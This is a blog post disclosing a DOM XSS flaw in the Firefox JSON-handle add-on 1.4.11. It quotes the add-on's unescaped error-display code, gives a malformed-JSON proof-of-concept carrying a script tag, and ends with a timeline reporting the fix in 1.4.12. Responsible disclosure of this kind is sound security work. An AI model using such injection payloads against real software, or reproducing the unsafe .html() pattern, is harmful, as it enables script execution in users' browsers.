---
layout: post
title: JSON-handle DomXSS Vulnerability (Ver 1.4.11 / 20160926)
---
- 获取：[https://addons.mozilla.org/en-US/firefox/addon/json-handle/reviews/](https://addons.mozilla.org/en-US/firefox/addon/json-handle/reviews/)
- It's a browser and editor for JSON document.You can get a beautiful view. 
- 对JSON格式的内容进行浏览和编辑，以树形图样式展现JSON文档，并可实时编辑。

刚好距上次发表 ChromeJsonView 的【[问题](https://www.n0tr00t.com/2016/04/28/JSONView-0day.html)】半年时间，这次简单描述下 Firefox 浏览器中 JsonHandle 最新版存在的安全缺陷，用户在转换 JSON 失败时，由于过滤不严谨导致 DOM 解析错误代码时触发攻击者构造的 JavaScript 代码：

    resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonH.js

        "showErrorTips" : function (sJson) {
            var oJsonCheck = oLineCode(sJson);
            if(oJsonCheck.oError) {
                var s = _pri.oLang.getStr('msg_4') + _pri.oLang.getStr('msg_5', oJsonCheck.oError.line+1) + ' : ' + '<span id="errorTarget">'+oJsonCheck.oError.lineText+'</span>';
                $('#tipsBox').html(s);
                _pri["holdErrorTips"] = false;
            }else{
                //alert('ok');
            }
            $('#errorCode').html(oJsonCheck.dom);

追踪变量 oJsonCheck.oError.lineText, var oJsonCheck = oLineCode(sJson);, _pri["insertErrorFlag"] ：

    resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonlint.js

        var oLineCode = (function() {
            var _pub_static = function() {
                var _pri = {},
                _pub = {};
                var _init = function(sJson) {
                    sJson = _pri.fixReturnline(sJson);
                    sJson = _pri.insertErrorFlag(sJson);
                    sJson = _pri.escape(sJson);
                    sJson = sJson.replace('@鈼�$#errorEm#$鈼咢', '<span class="errorEm">').replace('@鈼�$#/errorEm#$鈼咢', '</span>');
                    sJson = '<ol><li><div>' + sJson.split('\n').join('</div></li><li><div>') + '</div></li></ol>'_pub["dom"] = $('<div class="line-code">' + sJson + '</div>');
                };

                _pri["fixReturnline"] = function(s) {
                    return s.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
                };

                _pri["insertErrorFlag"] = function(s) {
                    var aLine = s.split('\n');
                    jsonlint.yy.parseError = function(sError, oError) {
                        var sLine = aLine[oError.line];
                        //console.log(sError, oError);
                        _pub.oError = oError;
                        aLine[oError.line] = sLine.slice(0, oError.pos) + '@鈼�$#errorEm#$鈼咢' + sLine.slice(oError.pos) + '@鈼�$#/errorEm#$鈼咢';
                    };

                    try {
                        jsonlint.parse(s);
                    } catch(e) {
                        _pri["hasError"] = true;
                    }
                    return aLine.join('\n');
                };

                _pri["escape"] = function(s) {
                    s = s || '';
                    return s.replace(/\&/g, '&amp;').replace(/\</g, '&lt;').replace(/\>/g, '&gt;').replace(/\"/g, '&quot;').replace(/ /g, '&nbsp;');
                };

                _init.apply(_pub, arguments);
                return _pub;
            };

            return _pub_static;
        } ());
        
_pri["insertErrorFlag"]:

	    var aLine = s.split('\n');
	    jsonlint.yy.parseError = function(sError, oError) {
	        var sLine = aLine[oError.line];
	        //console.log(sError, oError);
	        _pub.oError = oError;
	        aLine[oError.line] = sLine.slice(0, oError.pos) + '@鈼�$#errorEm#$鈼咢' + sLine.slice(oError.pos) + '@鈼�$#/errorEm#$鈼咢';

根据上面的代码缺陷我们可以构造一个报错的 JSON 格式 ：

![](https://ws3.sinaimg.cn/large/c334041bgw1fa7p1sku9oj211q0os0yp.jpg)

	{"Success":true,"Message":"success","Code":200,"ReturnValue":[{"FromCityName":"宜昌","FromCityId":197,"FromCityPy":"","BatchNo":"318_y5abL0_FB_6_3_9","LineProperty":"","ProjectType":7,"ProductId":115590,"Title":"【南昌往返】【双动往返】【黄金系列】长江三峡宜昌-重庆5晚6日游","SubTitle":"邮轮","Price":3200.00,"ProductUrl":"http://www.ly.com/youlun/tours-115590.html#Resys=318_y5abL0_FB_6_3_9","ProductImgUrl":"http://pic3.40017.cn/c_420x272_001111111.jpg"<script>prompt`a1`//","RedTab":""},]}

不过想要加载外域 JS 进一步利用还有一个小坑在里面，我们通过断点调试可以看到 sJson, LineText, s 的值分别为：

![](https://ws4.sinaimg.cn/large/c334041bgw1fa7p0llmllj21kw0g0dm5.jpg)

	- ….c_420x272_001111111.jpg"<script>payload:01234567899876543210//","RedTab":""}
	- ...0x272_001111111.jpg"<script>payload:0123
	- JSON format error@line 1 : <span id="errorTarget">...0x272_001111111.jpg"<script>payload:0123</span>

这是由于代码中的 upcomingInput 对长度进行了限制，但这不影响我们依然可以利用一些技巧来实施攻击：

	resource://jsonhandle-at-gmail-dot-com/data/JSON-handle/js/jsonlint.js

	    upcomingInput:function () {
	            var next = this.match;
	            if (next.length < 20) {
	                next += this._input.substr(0, 20-next.length);
	            }
	            var s = (next.substr(0,20)+(next.length > 20 ? '...':'')).replace(/\n/g, "");
	            return s;
	        }

#### VulnTimeline

- Find the vulnerability. - 2016/11/25 13:00
- Report jsonhandle#gmail.com - 2016/11/27 12:10
- Write the Paper, via @evi1m0. - 2016/11/29 00:00
- Fixed, /json-handle/versions/#version-1.4.12 - 2016/12/28
